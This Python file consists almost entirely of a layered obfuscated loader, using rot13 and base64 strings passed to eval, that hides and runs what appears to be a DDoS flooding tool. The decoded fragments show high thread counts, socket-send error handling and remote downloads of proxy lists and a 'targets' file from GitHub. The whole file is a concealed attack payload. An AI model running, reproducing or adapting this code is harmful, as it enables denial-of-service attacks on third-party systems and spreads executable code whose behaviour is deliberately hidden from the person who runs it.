import base64, codecs
magic = 'aW1wb3J0IGJhc2U2NCwgY29kZWNzDQptYWdpYyA9ICdabkp2YlNCaGMzbHVZMmx2SUM1c2IyY2dhVzF3YjNKMElHeHZaMmRsY2lCaGN5QmhjM2x1WTJsdlgyeHZaMmRsY2lBamJHbHVaVG94Q21aeWIyMGdZMjl1ZEdWNGRHeHBZaUJwYlhCdmNuUWdjM1Z3Y0hKbGMzTWdJMnhwYm1VNk1ncHBiWEJ2Y25RZ2JHOW5aMmx1WnlBamJHbHVaVG96Q21aeWIyMGdiWFZzZEdsd2NtOWpaWE56YVc1bklHbHRjRzl5ZENCamNIVmZZMjkxYm5RZ0kyeHBibVU2TkFwbWNtOXRJSEJoZEdoc2FXSWdhVzF3YjNKMElGQmhkR2dnSTJ4cGJtVTZOUXBtY205dElIUjVjR2x1WnlCcGJYQnZjblFnVDNCMGFXOXVZV3dnTEZSMWNHeGxJQ05zYVc1bE9qWUthVzF3YjNKMElIZGhjbTVwYm1keklDTnNhVzVsT2pjS1puSnZiU0JqYjJ4dmNtRnRZU0JwYlhCdmNuUWdSbTl5WlNBamJHbHVaVG81Q25kaGNtNXBibWR6SUM1bWFXeDBaWEozWVhKdWFXNW5jeUFvSW1sbmJtOXlaU0lwSTJ4cGJtVTZNVElLWTJ4aGMzTWdVbVZ0YjNabFZYTmxiR1Z6YzFkaGNtNXBibWR6SUNoc2IyZG5hVzVuSUM1R2FXeDBaWElnS1RvamJHbHVaVG94TlFvZ0lDQWdaR1ZtSUdacGJIUmxjaUFvVHpCUFR6QXdUekJQTUU4d1R6QlBNRThnTEU4d1QwOHdNREJQTUU4d01EQlBUekF3SUNrNkkyeHBibVU2TVRZS0lDQWdJQ0FnSUNCeVpYUjFjbTRnWVd4c0lDZ29Jbk52WTJ0bGRDNXpaVzVrS0NrZ2NtRnBjMlZrSUdWNFkyVndkR2x2Ymk0aWJtOTBJR2x1SUU4d1QwOHdNREJQTUU4d01EQlBUekF3SUM1blpYUk5aWE56WVdkbElDZ3BMQ0pUVTB3Z1kyOXVibVZqZEdsdmJpQnBjeUJqYkc5elpXUWlibTkwSUdsdUlFOHdUMDh3TURCUE1FOHdNREJQVHpBd0lDNW5aWFJOWlhOellXZGxJQ2dwS1NramJHbHVaVG95TUFwTVQwZEhSVkpmVFZOSFgwWlBVazFCVkNBOUoxc2xLR0Z6WTNScGJXVXBjeUF0SUNVb2JHVjJaV3h1WVcxbEtYTmRJQ1VvYldWemMyRm5aU2x6SnlOc2FXNWxPakl6Q2t4UFIwZEZVbDlFUVZSRlgwWlBVazFCVkNBOUlpVklPaVZOT2lWVElpTnNhVzVsT2pJMENteCcNCmxvdmUgPSAnaU0ycWNvenB0WXpXdXAyeXdEMjloTXp5YVZQdXpvM1dnTEtEdENIa0NFMHFTSHk5QUgwcXNFeDlGR0hTSFZQa3hMS0V5TXoxMFZ'
love = 'EZIcUZUSIEHyKp0IFH0uSFGyHEmSKDHEWEUELExSzoxb1rHW3IwWDrzgcGGWkrKO2GwyiIQyuGGW5nR1fGzuAZxxjE1D5LH0lFJkJHUEuo0c1rR1HBJ1YZ09fomA1AIqfrUqiIUybGHqvoRSdL2MiZaSuGHgJqSyuDKykHzg5pKcWMyMDqTSTFQIHE2kjL1Lln2Airxt2Jaq0JRkYDGIirxSwomR5Mz8lpJSAF1M0JKcGrR1FGJAiIHI5pUMBLxu6FJqiZ015FHgOrJ9HFJ1jZKS1pUb1L296pJ1JHUEwJRMOMz5XAKyPq1ceHUcSrH12G21AF0HkpSZ5Z28mI2IAF1qmo1D5LH0lFJkJHUIQEmN4nycFBHAnHH9QJySBnycFBHAUoR42EmACZT5XBJuZFzc0FwSSZKOHn3yJH2qwo2SRqSyHrJukHR9kF0M4M0A4AJyirxu0DaMOMz5XAKyPq1bjHUMBqSMDG2AAqx9QEmN4nycFBHAnHH9QJySBnycFBHAUoR9wpTkCDz8lAKyJHJAfGHgSZKO6AUEJZzgwo3cVAycgFSuJHR50IyV4nycFBTcUoH9QE21BnycFBTcUZQyQIyOeD0pjBTcnHH9QJySCD0qgGzcUZQyQJyOBBHpjBHAnHH9QE21BnxqgGzcnHH9QEmN4qSLln2Airxt2Jz1ZJSMDGaEJHwyQJySBnxpjBTcUZQyQJySCD1cFBHAJHGSzomWkLJ5XAJSJHQIHomAKM0kYEGOAF1M0JSEZqxbmM0AnHH9QJyV4nxpjBTcnHH9QJyV5D0pmZTylZQyQE21BnycFBTcnHwyQJySCD0pjBTcmFGO0pwOeD0HjpIAVrGyOFQOkp0I4BHMUFSAVp0MJMx1HHmOAFx1apIOBBHqFBIISZRyTFmOSG0yFFKASrQyTE0uGFSMDrUqiIUybGHqvoHWBLaEJHR50pGW5ZT5DG21kF09dpUcWoKOfGzWSF3I3GHgCZT5XBJuJHUt2IwWeL296FQMnoKuLIyOBqSMDGaEJHR9zomWkLH1YIaEMLH91pUcWnUSDGzuhISAbGIEerKOuJaEXoH50F0L1oH1YEIEiZ1qaGRgSZR1YIaELHwyQJySBnxpjBTcUZQyQJySCD1cFBHAJHUu3o1E5nR1ULwOnGzATEmN5FRfjEIqVqx45FSEGZT5DGzWYZGy6oxcerHfkBUELEwIdGRgKrJ9uEUEMLH91pUbaQDcao2DtCFNaIaIxD0SdLxqfqIcHomOAq3OEIJf5JIAIIyELZIMGIRMAM1OGM25uFSVjL0uAAxk5BKyMJTA1JwWfZTSVIzyxJR5fL21BqzWhHzkvoyS1JGV5qRjmDaMwoyWiLwW4oRkKEacMZyM1JxZknzSKAKIMImS2Lzx5nTZmGzkxFR12LyqTpTWcBUuZoyV0MRAwp0blnQOxFRW6G2x4qzAgEwAZoJEjMRqbZIyhIacnJRcdLwV1ZScKAG'
god = 'BMbU52YlM5d2IzSjBhRzlzWlMxaGMyTmxibVF0WTJsdWJtRnRiMjR2WVhOelpYUnpMMjFoYVc0dk1pNTBlSFFuTENkb2RIUndjem92TDNKaGR5NW5hWFJvZFdKMWMyVnlZMjl1ZEdWdWRDNWpiMjB2Y0c5eWRHaHZiR1V0WVhOalpXNWtMV05wYm01aGJXOXVMMkZ6YzJWMGN5OXRZV2x1THpNdWRIaDBKeXduYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMM0J2Y25Sb2IyeGxMV0Z6WTJWdVpDMWphVzV1WVcxdmJpOWhjM05sZEhNdmJXRnBiaTgwTG5SNGRDY3NLU05zYVc1bE9qVXdDa2xVWDBGU1RWbGZRMDlPUmtsSFgxVlNUQ0E5SjJoMGRIQnpPaTh2WjJsemRDNW5hWFJvZFdKMWMyVnlZMjl1ZEdWdWRDNWpiMjB2UW1sdmJtVmpXQzgxTnpVNU1EQTROalk0T0RNd1pqZGlZVEV3WkRsbFpUazRObUpoTXpKalpDOXlZWGN2TnpZd05UVmxaamc0WlRZd01qTm1ORGRqWVRZek9HSXdNMlF6TkdGalpHTmtZV0psTkRJMFpTOXRhR1J2YzE5MFlYSm5aWFJ6WDNSamNGOTJNaTUwZUhRbkkyeHBibVU2TlRFS1ZrVlNVMGxQVGw5VlVrd2dQU2RvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRbWx2Ym1WaldDOXRhR1JrYjNOZmNDOXRZV2x1TDNabGNuTnBiMjR1ZEhoMEp5TnNhVzVsT2pVeUNrTlFWVjlEVDFWT1ZDQTlZM0IxWDJOdmRXNTBJQ2dwSTJ4cGJtVTZOVFFLUkVWR1FWVk1WRjlVU0ZKRlFVUlRJRDAzTlRBd0lHbG1JRU5RVlY5RFQxVk9WQ0ErTVNCbGJITmxJREV3TURBZ0kyeHBibVU2TlRVS1ExQlZYMUJGVWw5UVVrOURSVk5USUQweUlDTnNhVzVsT2pVM0NrTlBUa1pKUjE5R1InDQpkZXN0aW55ID0gJ0lFUUZTOUZFSUVGRkhJR1ZRMDFWUEFmbko1eUJ3SDRQeEFDR3hNV0UxOVRFSUVRRlM5SEZIMVNHMUlIVlEwa0FGTndvVHloTUdiMUJEY0ZFSE1GRUlBVkswOUpFSVdIRkgxU1ZRMGxWUEFmbko1eUJ3TGpQeVdTRXlXU0gwdXNIeFNIRUZOOUFGTndvVHloTUdiMlpEY1RESHlaSUlXU0swV0lFUnFTSVM5VERIQUhHMVZ0Q0dadFYya2Nvekg2QXdWWEV4U1dHU0lGRUk5UkVIa09KSTlHRUhBQ0d4RUdWUTBrVlBBZm5KNXlCd0xtUHg5QkdTeXNHSXlzRklOdENHUmpaUE53b1R5aE1HYjJBTmNHRDB1U0VTSVpFS'
destiny = 'IqmExt1I0yFrH9UHmyEERyCG0DjrHuXEx45JzkBq29HrJuAE2VlDHEwE0DjqIASH0ynEHyKp0qVrHWYZUyPExySp0I5I09RZHIKEmN0qRAUGzunEx53o1E5nR1ULwWOqTAUEQO1H0IGFIcSFIqmE0uGGRfjrHWTFHImEKyKG0DkEIqUZQE0D0qBnRSTGaqiIUybGHqvZxSdL0qRZUIGEIAWJxIWI3ASrQyTEwR5E0DjH1cSEx45JzkBq29HrJuAE2VlDx5wHHpjAHWYZH9TEmOKH0fkG1AVrUyQEIOBBHSTGaqiIUybGHqvZxWRL0ySH09mEUuGFRDjqKAVHyAEEwOWFRufGwynE0k0IwWeL296FQMOoH5LFHuSERfjFHWUZSqWEKyOp0uFH0yVZRu0D0qBnRSTGaqiIUybGHqvZ1cRL3qiISAgpTkCq29DGwMJZzgwo3cVAxSgESuJHR50IyVkG0HjFHWWHyW0D0uAnKO6FUEMrTgKEGO1FRqVH1ISFQIVERx5H0cDGaqiIUybGHqvZ0SRLaEJHR50EQS5G0q2GwySrwyfGHMBnRqFrIITH0IEFxuGDxfjFHkJHRSzoxb1rHW3pQWDqx50IyOCHRqGFIAJHGSHomAKrIMDAIcTFUSJFIWKJxyVFKASFKE0IwWeL296FQMOoKOLIyOBqSMFpHMSFRyPIyRkIT8mI3yJHQInExukIxyFpHMSFRyPFmOWGSMDDJMhFwI5DaqjASO2GaEJHR9AEHueJxpkpUEQFR1cpUcVqSy4n1qSZUIVFxuWJxqFBHgYZRyZIyOOMz5XAKyPq3N1HUMBqSMDG0MSFRE0D0uAnKO6FUEMrTgKEGO1FRu4FIWYZRyZIyOOMz5XAKyPq3EdHUMBqSMDG0MSFHSGFIOBBHI6BJkAEx5bFUuWE0IWEUEJZzgwo3cVAxWEHyuDqQ09Wj0Xnz95VQ0tW1k4AmWprQMzKUt3ASk4ZmSprQZmWj0XqUW1p3DtCFOyqzSfXPqprQMxKUt2ZIk4AwqprQL5KUt2ZlpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQMwKUt2Myk4AmMprQL1KUtlL1k4ZwOprQMuKUt2Myk4AmyprQV5WlxtXlOyqzSfXPqprQL3KUt2Myk4AwDaXFNeVTI2LJjbW1k4AwAprQMzKUt2ASk4AwIprQLmKUt3Z1k4ZzIprQL0KUt2AIk4AwAprQMzKUt2ASk4AwIprQV4KUt2ASk4AwIprQpmKUt3ASk4AwyprQMyKUt3BIk4ZzAprQVjKUt2LIk4AzMprQp5KUtlBFpcQDcyqzSfXTAioKOcoTHbLzSmMGL0YzV2ATEyL29xMFuyqzSfXPqprQp0KUt3Zyk4AmIprQpmKUt3APpcXFjaCUA0pzyhMm4aYPqyrTIwWlxcQDb='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))